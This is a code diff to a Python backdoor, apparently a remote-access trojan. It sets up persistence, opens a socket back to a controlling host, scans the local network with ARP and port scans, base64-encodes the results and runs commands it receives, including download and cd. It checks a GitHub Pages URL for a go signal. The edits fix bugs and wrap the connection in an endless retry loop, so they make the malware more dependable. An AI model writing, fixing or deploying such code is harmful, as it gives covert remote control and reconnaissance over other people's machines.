@@ -21,7 +21,7 @@ from time import sleep
 import requests
 class MotherFucker():
     def __init__(self, ip, port):
-	self.persistence()
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     def persistence(self):
@@ -75,7 +75,7 @@ class MotherFucker():
         except:
             return " "
     def arp_scan(self):
-        # scans the entire network 
+        # scans the entire network
         ip = self.get_ip.private
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -99,7 +99,7 @@ class MotherFucker():
                 s.close()
         except KeyboardIntrrupt:
             data += "\nKeyboard Intrupted ."
-            pass 
+            pass
         except socket.gaierror:
             data += f"\nCould not Resolve IP : {target}"
             sys.exit()
@@ -110,10 +110,10 @@ class MotherFucker():
     def scan_result(self):
         result = ""
         for host in self.arp_scan:
-            result += self.port_scan(host) 
+            result += self.port_scan(host)
         encoded_result = base64.b64encode(result)
         return encoded_result
-        
+
 
     def run(self):
         while True:
@@ -121,7 +121,7 @@ class MotherFucker():
             try:
                 if rcvd_cmd[0] == "exit":
                     self.connection.close()
-                    sys.exit() 
+                    sys.exit()
                 elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                     cmd_rslt = self.change_dir(rcvd_cmd[1])
                 elif rcvd_cmd[0] == "download":
@@ -143,16 +143,17 @@ class MotherFucker():
 
 def get_status():
     s = requests.get('https://poggerpussy.github.io').text
-    status = re.sub(r"<.*?>",'', status)
+    status = re.sub(r"<.*?>",'', s)
     return status
 
 
+
 if __name__ == "__main__":
-    try:
-        if get_status:
-            app = MotherFucker("127.0.0.1", "80")
-            app.run()
-        sleep(10)
-    except Exception as e:
-        print(e)
-        pass
+    while True:
+        try:
+            if get_status:
+                app = MotherFucker("0.0.0.0", 80)
+                app.run()
+        except Exception as e:
+            print(e)
+            pass
